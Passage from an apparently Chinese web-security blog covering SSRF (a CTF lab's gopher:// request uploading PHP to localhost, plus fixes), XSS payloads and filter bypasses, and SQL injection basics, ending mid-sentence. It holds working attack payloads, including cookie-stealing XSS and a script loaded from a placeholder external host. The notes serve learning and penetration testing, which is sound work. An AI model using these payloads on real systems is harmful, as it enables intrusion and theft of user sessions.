class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://challenge-f3618cb7fceb51b1.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-php">-----------------------------<span class="hljs-number">30615965732783302828302128172</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;text.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">phpinfo</span>();</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br><span class="language-php">-----------------------------<span class="hljs-number">30615965732783302828302128172</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">æäº¤æ¥è¯¢</span><br><span class="language-php">-----------------------------<span class="hljs-number">30615965732783302828302128172</span>--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>修改HOST为”127.0.0.1:80”，重复上关的编码即可：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:80<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------30615965732783302828302128172<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>375<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://challenge-f3618cb7fceb51b1.sandbox.ctfhub.com:10800<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://challenge-f3618cb7fceb51b1.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-php">-----------------------------<span class="hljs-number">30615965732783302828302128172</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;text.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">phpinfo</span>();</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br><span class="language-php">-----------------------------<span class="hljs-number">30615965732783302828302128172</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">æäº¤æ¥è¯¢</span><br><span class="language-php">-----------------------------<span class="hljs-number">30615965732783302828302128172</span>--</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64;%2520rv:100.0)%2520Gecko/20100101%2520Firefox/100.0%250D%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8%250D%250AAccept-Language:%2520zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%250D%250AAccept-Encoding:%2520gzip,%2520deflate%250D%250AContent-Type:%2520multipart/form-data;%2520boundary=---------------------------30615965732783302828302128172%250D%250AContent-Length:%2520375%250D%250AOrigin:%2520http://challenge-f3618cb7fceb51b1.sandbox.ctfhub.com:10800%250D%250AConnection:%2520close%250D%250AReferer:%2520http://challenge-f3618cb7fceb51b1.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php%250D%250AUpgrade-Insecure-Requests:%25201%250D%250A%250D%250A-----------------------------30615965732783302828302128172%250D%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%2522text.php%2522%250D%250AContent-Type:%2520application/octet-stream%250D%250A%250D%250A%253C?php%250D%250A%2509phpinfo();%250D%250A?%253E%250D%250A-----------------------------30615965732783302828302128172%250D%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%25C3%25A6%25C2%259F%25C2%25A5%25C3%25A8%25C2%25AF%25C2%25A2%250D%250A-----------------------------30615965732783302828302128172--<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081738110.png" alt="image-20220519000232956"></p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>这里其实就是实现了从其他服务器获取资源的功能，且这个其他服务的地址可控，就可以尝试。</p><p>容易出现的位置：</p><ol><li>社交功能：获取超链接的标题分享内容等进行显示</li><li>转服务：通过URL地址把原地址的网页内容调优适合手机屏幕浏览</li><li>翻译：给网址翻译网页的内容</li><li>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址或下载图片</li><li>图片&#x2F;文章收藏功能：主要是其会取URL地址中的标题以及显示文本的内容作为以求一个好的用具体验</li><li>举办一场：会来判断它服务的一些命令可以继续执行，所以如果云可能会自己进行远程测试，就可以继续执行某些命令</li><li>网站采集、网站抓取的地方：一些网站会针对你输入的网址进行信息采集工作</li><li>函数数据库功能：数据库的比如mongodb的copyDatabase</li><li>邮件系统：例如接收邮件服务器地址</li><li>编码处理、属性信息处理、文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api以及其他扩展调用URL的功能：可以利用google语法和这些实现关键字去寻找SSRF漏洞。一些url中的关键字有：share、wap、url、link、src、source、target、 u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源</li></ol><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的 文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 </li><li>禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引 起的问题 </li><li>设置 URL 白名单或者限制内网 IP（使用 gethostbyname()判断是否为内网 IP） </li><li>限制请求的端口为 http 常用的端口，比如 80、443、8080、8090 6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>WEB漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS 跨站脚本攻击</title>
    <link href="/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    <url>/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS 跨站脚本攻击"></a>XSS 跨站脚本攻击</h1><p>漏洞原理：用户输入的参数被回显到页面且可以闭合 HTML 标签，执行前端代码。</p><p>其的本质就是<strong>闭合</strong>前端代码，从而构筑恶意代码攻击。</p><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><ul><li>反射型：代码被插入本 HTML 页面，刷新后就会消失</li><li>存储型：代码被存储到数据库，一直存在</li><li>DOM型：纯前端代码造成的反射型 XSS</li></ul><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>SRC 上面正常的 XSS 不好挖，可以从文件上传入手：</p><ul><li><code>html</code></li><li><code>svg</code></li><li><code>pdf</code></li></ul><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">filename=test.svg<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>image/svg+xml<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> standalone=<span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span></span><br><span class="hljs-tag"> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">polygon</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;triangle&quot;</span> <span class="hljs-attr">points</span>=<span class="hljs-string">&quot;0,0 0,50 50,0&quot;</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">&quot;#009900&quot;</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">&quot;#004400&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h3><p><a href="https://www.shipinzhuanhuan.cn/pdfeditor14/">https://www.shipinzhuanhuan.cn/pdfeditor14/</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081012202.png" alt="image-20230313164417987"></p><h2 id="常用Payload"><a href="#常用Payload" class="headerlink" title="常用Payload"></a>常用Payload</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)&lt;/script&gt;  <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>   <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>        <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>      <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xxx.com/xss.js</span>&gt;</span></span>&lt;/script&gt;  <br>&lt;svg onload=&quot;alert(1)&quot;&gt;<br>&lt;svg οnlοad=&quot;alert(1)&quot;//<br>&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt;<br>&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie<br>&lt;body οnlοad=alert(1)&gt;<br>&lt;body οnpageshοw=alert(1)&gt;<br>&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;<br>&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>主要思想和绕 WAF 相同，后端进行如果过滤 XSS ？</p><ol><li>符号实体化 - 其他符号？</li><li>关键字过滤 - 同义函数？</li></ol><h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><p>无法闭合标签就闭合属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br><span class="hljs-string">*/--&gt;&#x27;&quot;</span>);&gt;&lt;<span class="hljs-regexp">/iframe&gt;&lt;/</span>script&gt;&lt;<span class="hljs-regexp">/style&gt;&lt;/</span>title&gt;&lt;<span class="hljs-regexp">/textarea&gt;&lt;a&gt;a&lt;/</span>a&gt;<br>#*<span class="hljs-regexp">/--&gt;&#x27;&quot;);&gt;&lt;/i</span>frame&gt;&lt;<span class="hljs-regexp">/script&gt;&lt;/</span>style&gt;&lt;<span class="hljs-regexp">/title&gt;&lt;/</span>textarea&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> &gt;</span></span><br><span class="language-xml">*/--&gt;</span>%cf<span class="hljs-string">&quot;%d5&#x27;&gt;&lt;/iframe&gt;&lt;/script&gt;&lt;/style&gt;&lt;/title&gt;&lt;/textarea&gt;</span><br><span class="hljs-string">%0D%0A// 换行</span><br></code></pre></td></tr></table></figure><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>script 、onerror 标签被过滤了如何绕过？</p><ol><li>双写</li><li>大小写</li><li>空字符</li><li>其他标签 Fuzz</li></ol><h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><p>当 alert 语句被过滤，如何绕过？</p><p>可以尝试eval触发，并把alert语句编码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JS"><span class="hljs-comment">// JS16编码</span><br>&lt;img src=<span class="hljs-string">&quot;1&quot;</span> onerror=<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;</span>)&gt;<br><span class="hljs-comment">//ASCII转UTF-16</span><br>&lt;img src=&quot;1&quot; onerror=eval(&quot;\u0061\u006C\u0065\u0072\u0074\u0028\u002F\u0078\u0073\u0073\u002F\u0029&quot;)&gt;<br>//ASCII转Unicode<br>&lt;img src=&quot;1&quot; onerror=eval(&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;&quot;)&gt;<br>//ASCII转Hex<br>&lt;img src=&quot;1&quot; onerror=eval(&quot;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2F;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2F;&amp;#x29;&quot;)&gt;<br>&lt;img src=&quot;1&quot; onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))&gt;<br>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YSBwcm90b2NvbCcpPC9zY3JpcHQ+&quot;&gt;&lt;/object&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;<br>&lt;input onclick=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;<br>&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;111&lt;/a&gt;<br>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;<br>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>空格、括号 &#x3D;&gt; <code>/</code></p><p>引号 &#x3D;&gt; 反引号</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>黑盒测试：</p><ol><li>先使用一个表示作为参数如 “9999”，然后看响应包中是否包含</li><li>如果有回显那么就看下能否绕过过滤构造 payload</li></ol><p>还有一种方法是 JS 审计，这个只搞过一次，挖到了 DOM XSS，不过不收。其主要就是看 JS 的写法，看那里的参数可控，这些可控参数又经历哪些操作？是否危险？</p><p>白盒审计：</p><ol><li>PHP 直接搜索页面输出函数，黑白结合测试即可</li><li>Java 先看过滤器，然后找功能点进行测试</li></ol><p>自动化工具：<code>w8ay</code> 佬的 <code>xscan</code></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>WEB漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL 注入</title>
    <link href="/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/SQL%2520%25E6%25B3%25A8%25E5%2585%25A5-16847616507953.png" alt="SQL 注入"></p><h2 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h2><p>用户输入的参数打破了SQL语句的原有逻辑，导致 SQL 语句可控。</p><p>本质上就是使用 “闭合符号” 闭合掉原来的 SQL 语句，然后执行另外的 SQL 语句。( 打破原本传递数据区域的边界，插入逻辑代码。)</p><p>比如，后端的 SQL 语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> FORM <span class="hljs-keyword">USER</span> <span class="hljs-keyword">WHERE</span> ID <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure><p><code>ID</code> 为可控参数，使用闭合符号闭合以执行另外的 <code>SQL</code> 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 输入 <span class="hljs-number">1</span><span class="hljs-string">&#x27; ORDER BY 2 &#x27;</span> (使用两个单引号闭合)<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> FORM <span class="hljs-keyword">USER</span> <span class="hljs-keyword">WHERE</span> ID <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">2</span> <span class="hljs-string">&#x27;&#x27;</span><br># 输入 <span class="hljs-number">1</span><span class="hljs-string">&#x27; ORDER BY # (使用单引号和注释符闭合)</span><br><span class="hljs-string">SELECT * FORM USER WHERE ID = &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; ORDER BY 2 # &#x27;</span><br># 输入 <span class="hljs-number">1</span><span class="hljs-string">&#x27; ORDER BY --+ (使用单引号和注释符闭合)</span><br><span class="hljs-string">SELECT * FORM USER WHERE ID = &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; ORDER BY 2 --+ &#x27;</span><br></code></pre></td></tr></table></figure><p>闭合掉原有的 <code>SQL</code> 逻辑，控制 <code>SQL</code> 语句，造成危害。</p><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="系统表"><a href="#系统表" class="headerlink" title="系统表"></a>系统表</h3><p>系统表中存储着数据库名、数据表名、列名，我们可以从系统表中查询相应的内容，更好的进行数据查询。</p><p>对于没有系统表的数据库，就只能依靠跑字典，收集对应数据库常见的名字，然后进行跑到一个正确的表名、字段名。</p><table><thead><tr><th>数据库</th><th>系统表</th></tr></thead><tbody><tr><td>MySql &gt; 5.0</td><td><code>information_schema.tables</code></td></tr><tr><td>Oracle</td><td><code>all_tables, user_tables</code></td></tr><tr><td>MSSQL</td><td><code>master, sysobjects</code></td></tr><tr><td>Access</td><td>无</td></tr><tr><td>PostgreSQL</td><td><code>pg_database, pg_tables</code></td></tr><tr><td>DB2</td><td><code>sysibm</code></td></tr></tbody></table><h3 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h3><p>MySql 中的一些信息函数：</p><table><thead><tr><th align="left">函数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><code>user()</code></td><td align="left">用户名</td></tr><tr><td align="left"><code>current_user()</code></td><td align="left">当前用户名</td></tr><tr><td align="left"><code>system_user()</code></td><td align="left">系统用户名</td></tr><tr><td align="left"><code>version()</code></td><td align="left">数据库版本号</td></tr><tr><td align="left"><code>@@datadir</code></td><td align="left">数据库路径</td></tr><tr><td align="left"><code>@@version_compile_os</code></td><td align="left">操作系统版本</td></tr><tr><td align="left"><code>database()</code>，<code>schema()</code></td><td align="left">当前所在数据库</td></tr></tbody></table><h3 id="时间函数"><a href="#时间函数" class="headerlink" title="时间函数"></a>时间函数</h3><table><thead><tr><th>数据库</th><th>时间函数</th></tr></thead><tbody><tr><td>MySql</td><td><code>sleep(5)</code></td></tr><tr><td>Oracle</td><td><code>DBMS_PIPE.RECEIVE_MESSAGE(&#39;a&#39;,5)</code></td></tr><tr><td>MSSQL</td><td><code>WAITFOR DELAY &#39;00.00.05&#39;</code></td></tr><tr><td>Access</td><td>无</td></tr><tr><td>PostgreSQL</td><td><code>pg_sleep(5)</code></td></tr></tbody></table><h3 id="布尔判断"><a href="#布尔判断" class="headerlink" title="布尔判断"></a>布尔判断</h3><p>MySql 中：</p><table><thead><tr><th>运算</th><th>Payload</th></tr></thead><tbody><tr><td>或</td><td>1 or 1&#x3D;1</td></tr><tr><td>异或</td><td>1 xor 1&#x3D;1</td></tr><tr><td>按位与</td><td>1 &amp; 1&#x3D;1</td></tr><tr><td>与</td><td>1 &amp;&amp; 1&#x3D;1</td></tr><tr><td>按位或</td><td>1 | 1&#x3D;1</td></tr><tr><td>或</td><td>1 || 1&#x3D;1</td></tr><tr><td>大于</td><td>1 &gt; 2</td></tr><tr><td>小于</td><td>1 &lt; 2</td></tr><tr><td>大于等于</td><td>4 &gt;&#x3D; 3</td></tr><tr><td>小于等于</td><td>3 &lt;&#x3D; 4</td></tr><tr><td>不等于</td><td>5&lt;&gt;5</td></tr><tr><td>不等于</td><td>5 !&#x3D; 5</td></tr><tr><td>兼容空值等于</td><td>3 &lt;&#x3D;&gt; 4</td></tr><tr><td>在…和…之间</td><td>5 is between 1 and 6</td></tr><tr><td>模糊匹配</td><td>1 like 1</td></tr><tr><td>空值断言</td><td>1 is null</td></tr><tr><td>非空断言</td><td>1 is not null</td></tr><tr><td>正则匹配</td><td>1 is regexp 1</td></tr><tr><td>在数组中</td><td>1 in (1)</td></tr></tbody></table><h2 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h2><p>常见的注入判断方式：</p><ol><li>逻辑判断</li><li>报错判断</li><li>延时判断</li></ol><p>逻辑判断：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-keyword">AND</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> 为 <span class="hljs-literal">true</span>, 页面返回正常<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> #<br># <span class="hljs-keyword">AND</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> 为 <span class="hljs-literal">false</span>, 页面返回异常<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> #<br></code></pre></td></tr></table></figure><p>报错判断：</p><ul><li>报错判断通常尝试使用 单引号、反斜杠 等字符，破坏原有的 SQL 逻辑，导致报错的产生 ( 后端输出报错才会产生 )</li></ul><p>延时判断：</p><ul><li>通过延时函数让页面返回时间延长，以判断释放存在注入</li></ul><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>联合注入的关键就是 <code>UNION</code> 关键字，拼接 2 个 <code>SELECT</code> 语句。所以后端是 <code>SELECT</code> 语句的时候才能使用 <code>UNION</code> 注入。</p><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>使用 <code>UNION</code> 关键字联合两个 <code>SELECT</code> 语句，一次查出两个 <code>SELECT</code> 的查询结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table1 <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table2;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li><code>UNION</code> 内部的每个 